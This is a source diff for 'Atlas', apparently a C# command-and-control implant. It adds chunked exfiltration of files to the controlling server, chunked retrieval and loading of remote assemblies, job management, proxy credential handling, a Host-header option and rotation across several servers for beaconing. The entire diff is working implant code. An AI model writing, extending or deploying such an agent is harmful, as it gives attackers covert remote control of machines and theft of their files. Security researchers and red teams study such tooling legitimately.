@@ -2,6 +2,7 @@
 
 using System;
 using System.Net;
+using System.Linq;
 #if DEFAULT
 using System.Text;
 #endif
@@ -27,7 +28,7 @@ namespace Atlas
                 };
                 Config.SessionId = GetStage.session_id;
                 string SerializedData = Crypto.EncryptStage(Utils.GetStage.ToJson(GetStage));
-                var result = Get(SerializedData, "checkin");
+                var result = Get(SerializedData);
                 string final_result = Crypto.Decrypt(result);
                 Utils.StageResponse StageResponse = Utils.StageResponse.FromJson(final_result);
                 Config.tempUUID = StageResponse.uuid;
@@ -50,7 +51,7 @@ namespace Atlas
 #elif (DEFAULT_PSK || DEFAULT_EKE)
                 string FinalSerializedData = Crypto.EncryptCheckin(Utils.CheckIn.ToJson(CheckIn));
 #endif
-                var new_result = Get(FinalSerializedData, null);
+                var new_result = Get(FinalSerializedData);
 #if (DEFAULT_PSK || DEFAULT_EKE)
                 string last_result = Crypto.Decrypt(new_result);
 #endif
@@ -79,6 +80,49 @@ namespace Atlas
         {
             try
             {
+                foreach (Utils.Job Job in JobList.jobs)
+                {
+                    if (Job.upload)
+                    {
+                        if (Job.total_chunks != Job.chunk_num)
+                        {
+                            if (!Job.chunking_started)
+                            {
+                                Utils.UploadTasking UploadTasking = Utils.UploadTasking.FromJson(Job.parameters);
+                                Job.file_id = UploadTasking.assembly_id;
+                                Job.path = UploadTasking.remote_path;
+                                Utils.Upload Upload = new Utils.Upload
+                                {
+                                    action = "upload",
+                                    chunk_size = Config.ChunkSize,
+                                    file_id = Job.file_id,
+                                    chunk_num = Job.chunk_num,
+                                    full_path = Job.path,
+                                    task_id = Job.task_id
+                                };
+                                Utils.UploadResponse UploadResponse = Http.GetUpload(Upload);
+                                Job.total_chunks = UploadResponse.total_chunks;
+                                Job.chunks.Add(UploadResponse.chunk_data);
+                                Job.chunking_started = true;
+                            }
+                            else
+                            {
+                                Job.chunk_num++;
+                                Utils.Upload ChunkUpload = new Utils.Upload
+                                {
+                                    action = "upload",
+                                    chunk_size = Config.ChunkSize,
+                                    file_id = Job.file_id,
+                                    chunk_num = Job.chunk_num,
+                                    full_path = Job.path,
+                                    task_id = Job.task_id
+                                };
+                                Utils.UploadResponse UploadResponse = Http.GetUpload(ChunkUpload);
+                                Job.chunks.Add(UploadResponse.chunk_data);
+                            }
+                        }
+                    }
+                }
                 Utils.GetTasking GetTasking = new Utils.GetTasking
                 {
                     action = "get_tasking",
@@ -89,7 +133,7 @@ namespace Atlas
 #elif (DEFAULT_PSK || DEFAULT_EKE)
                 string SerializedData = Crypto.Encrypt(Utils.GetTasking.ToJson(GetTasking));
 #endif
-                var result = Get(SerializedData, null);
+                var result = Get(SerializedData);
 #if DEFAULT
                 string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
@@ -113,8 +157,40 @@ namespace Atlas
                         job_started = false,
                         success = false,
                         command = task.command,
-                        parameters = task.parameters
+                        parameters = task.parameters,
+                        total_chunks = 0
                     };
+                    if (Job.command == "loadassembly" || Job.command == "upload")
+                    {
+                        Job.upload = true;
+                        Job.total_chunks = 2;
+                        Job.chunk_num = 1;
+                    }
+                    else if (Job.command == "download")
+                    {
+                        Job.download = true;
+                    }
+                    else if (Job.command == "jobs")
+                    {
+                        Job.response = Modules.GetJobs(JobList);
+                        Job.completed = true;
+                        Job.success = true;
+                    }
+                    else if (Job.command == "jobkill")
+                    {
+                        if (Modules.KillJob(JobList, Int32.Parse(Job.parameters)))
+                        {
+                            Job.completed = true;
+                            Job.success = true;
+                            Job.response = "Job successfully removed";
+                        }
+                        else
+                        {
+                            Job.completed = true;
+                            Job.success = false;
+                            Job.response = "Could not remove job";
+                        }
+                    }
                     JobList.jobs.Add(Job);
                     ++JobList.job_count;
                 }
@@ -135,7 +211,7 @@ namespace Atlas
 #elif (DEFAULT_PSK || DEFAULT_EKE)
                 string SerializedData = Crypto.Encrypt(Utils.Upload.ToJson(Upload));
 #endif
-                var result = Get(SerializedData, null);
+                var result = Get(SerializedData);
 #if DEFAULT
                 string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
@@ -163,9 +239,9 @@ namespace Atlas
                 };
                 foreach (Utils.Job Job in JobList.jobs)
                 {
-                    if (!Job.completed == false)
+                    if (Job.completed)
                     {
-                        if (Job.success == false)
+                         if (!Job.success)
                         {
                             Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                             {
@@ -173,9 +249,103 @@ namespace Atlas
                                 user_output = null,
                                 status = "error",
                                 completed = "false",
-                                error = Job.response
+                                error = Job.response,
+                                total_chunks = null,
+                                full_path = null,
+                                chunk_num = null,
+                                chunk_data = null,
+                                file_id = null
                             };
                             PostResponse.responses.Add(TaskResponse);
+                        }
+                        else if (Job.download)
+                        {
+                            if (Job.file_id == null)
+                            {
+                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                {
+                                    task_id = Job.task_id,
+                                    user_output = null,
+                                    status = null,
+                                    completed = null,
+                                    error = null,
+                                    total_chunks = Job.total_chunks,
+                                    full_path = Job.path,
+                                    chunk_num = null,
+                                    chunk_data = null,
+                                    file_id = null
+                                };
+                                PostResponse.responses.Add(TaskResponse);
+                            }
+                            else if (Job.chunk_num == Job.total_chunks)
+                            {
+                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                {
+                                    task_id = Job.task_id,
+                                    user_output = null,
+                                    status = null,
+                                    completed = "true",
+                                    error = null,
+                                    total_chunks = null,
+                                    full_path = null,
+                                    chunk_num = Job.chunk_num,
+                                    chunk_data = Job.chunks[0],
+                                    file_id = Job.file_id
+                                };
+                                PostResponse.responses.Add(TaskResponse);
+                            }
+                            else
+                            {
+                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                {
+                                    task_id = Job.task_id,
+                                    user_output = null,
+                                    status = null,
+                                    completed = null,
+                                    error = null,
+                                    total_chunks = null,
+                                    full_path = null,
+                                    chunk_num = Job.chunk_num,
+                                    chunk_data = Job.chunks[0],
+                                    file_id = Job.file_id
+                                };
+                                PostResponse.responses.Add(TaskResponse);
+                            }
+                        }
+                        else if ((Job.total_chunks != 0) && (!Job.upload))
+                        {
+                            if (Job.chunk_num != Job.total_chunks)
+                            {
+                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                {
+                                    task_id = Job.task_id,
+                                    user_output = Job.chunks[0],
+                                    completed = "false",
+                                    error = null,
+                                    total_chunks = null,
+                                    full_path = null,
+                                    chunk_num = null,
+                                    chunk_data = null,
+                                    file_id = null
+                                };
+                                PostResponse.responses.Add(TaskResponse);
+                            }
+                            else
+                            {
+                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
+                                {
+                                    task_id = Job.task_id,
+                                    user_output = Job.chunks[0],
+                                    completed = "true",
+                                    error = null,
+                                    total_chunks = null,
+                                    full_path = null,
+                                    chunk_num = null,
+                                    chunk_data = null,
+                                    file_id = null
+                                };
+                                PostResponse.responses.Add(TaskResponse);
+                            }
                         }
                         else
                         {
@@ -184,7 +354,12 @@ namespace Atlas
                                 task_id = Job.task_id,
                                 user_output = Job.response,
                                 completed = "true",
-                                error = null
+                                error = null,
+                                total_chunks = null,
+                                full_path = null,
+                                chunk_num = null,
+                                chunk_data = null,
+                                file_id = null
                             };
                             PostResponse.responses.Add(TaskResponse);
                         }
@@ -200,7 +375,7 @@ namespace Atlas
 #elif (DEFAULT_PSK || DEFAULT_EKE)
                 string SerializedData = Crypto.Encrypt(Utils.PostResponse.ToJson(PostResponse));
 #endif
-                var result = Post(SerializedData);
+                string result = Post(SerializedData);
 #if DEFAULT
                 string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
@@ -211,13 +386,47 @@ namespace Atlas
                 {
                     foreach (Utils.Job Job in JobList.jobs)
                     {
-                        if (!Job.completed == false)
+                        if (Job.completed)
                         {
                             if (Job.task_id == Response.task_id)
                             {
                                 if (Response.status == "success")
                                 {
-                                    Utils.RemoveJob(Job, JobList);
+                                    if (Job.download)
+                                    {
+                                        if (Job.file_id == null)
+                                        {
+                                            Job.file_id = Response.file_id;
+                                        }
+                                        if (Job.total_chunks == Job.chunk_num)
+                                        {
+                                            Utils.RemoveJob(Job, JobList);
+                                        }
+                                        else
+                                        {
+                                            if (Job.chunks.Count != 0)
+                                            {
+                                                Job.completed = true;
+                                                Job.chunks.RemoveAt(0);
+                                            }
+                                        }
+                                    }
+                                    else if ((Job.total_chunks != 0) && (!Job.upload))
+                                    {
+                                        if (Job.chunk_num + 1 != Job.total_chunks)
+                                        {
+                                            Job.chunks.RemoveAt(0);
+                                            Job.chunk_num++;
+                                        }
+                                        else
+                                        {
+                                            Utils.RemoveJob(Job, JobList);
+                                        }
+                                    }
+                                    else
+                                    {
+                                        Utils.RemoveJob(Job, JobList);
+                                    }
                                 }
                             }
                         }
@@ -232,67 +441,79 @@ namespace Atlas
         }
 
 #if (DEFAULT || DEFAULT_PSK || DEFAULT_EKE)
-        public static string Get(string B64Data, string Type)
+        public static string Get(string B64Data)
         {
             string result = null;
-            WebClient client = new System.Net.WebClient
+            WebClient client = new System.Net.WebClient();
+            if (Config.DefaultProxy)
             {
-                UseDefaultCredentials = true,
-                Proxy = WebRequest.DefaultWebProxy
-            };
-            client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+                client.Proxy = WebRequest.DefaultWebProxy;
+                client.UseDefaultCredentials = true;
+                client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+            }
+            else 
+            {
+                WebProxy proxy = new WebProxy
+                {
+                    Address = new Uri(Config.ProxyAddress),
+                    UseDefaultCredentials = false,
+                    Credentials = new NetworkCredential(Config.ProxyUser, Config.ProxyPassword)
+                };
+                client.Proxy = proxy;
+            }
             client.Headers.Add("User-Agent", Config.UserAgent);
-            if (Config.HostHeader != null)
+            if (Config.HostHeader != "")
             {
                 client.Headers.Add("Host", Config.HostHeader);
             }
             client.QueryString.Add(Config.Param, B64Data.Replace("+", "%2B").Replace("/", "%2F").Replace("=", "%3D").Replace("\n", "%0A"));
-            if (Type != null)
+            Config.Servers = Config.Servers.OrderBy(s=>s.count).ToList();
+            try
             {
-                foreach (string Server in Config.Servers)
-                {
-                    try
-                    {
-                        string Uri = Server + Config.Url;
-                        result = client.DownloadString(Uri);
-                        Config.Domain = Server;
-                        break;
-                    }
-                    catch
-                    {
-                        continue;
-                    }
-                }
+                result = client.DownloadString(Config.Servers[0].domain + Config.Url);
+                return result;
             }
-            else
+            catch
             {
-                result = client.DownloadString(Config.Domain + Config.Url);
+                Config.Servers[0].count++; 
+                return result;
             }
-            return result;
         }
 
         public static string Post(string B64Data)
         {
             string result = null;
-            WebClient client = new System.Net.WebClient
+            WebClient client = new System.Net.WebClient();
+            if (Config.DefaultProxy)
             {
-                UseDefaultCredentials = true,
-                Proxy = WebRequest.DefaultWebProxy,
-            };
-            client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+                client.Proxy = WebRequest.DefaultWebProxy;
+                client.UseDefaultCredentials = true;
+                client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+            }
+            else
+            {
+                WebProxy proxy = new WebProxy
+                {
+                    Address = new Uri(Config.ProxyAddress),
+                    UseDefaultCredentials = false,
+                    Credentials = new NetworkCredential(Config.ProxyUser, Config.ProxyPassword)
+                };
+                client.Proxy = proxy;
+            }
             client.Headers.Add("User-Agent", Config.UserAgent);
-            if (Config.HostHeader != null)
+            if (Config.HostHeader != "")
             {
                 client.Headers.Add("Host", Config.HostHeader);
             }
-            string Uri = Config.Domain + Config.Url;
+            Config.Servers = Config.Servers.OrderBy(s => s.count).ToList();
             try
             {
-                result = client.UploadString(Uri, B64Data);
+                result = client.UploadString(Config.Servers[0].domain + Config.Url, B64Data);
                 return result;
             }
             catch
             {
+                Config.Servers[0].count++;
                 return result;
             }
         }
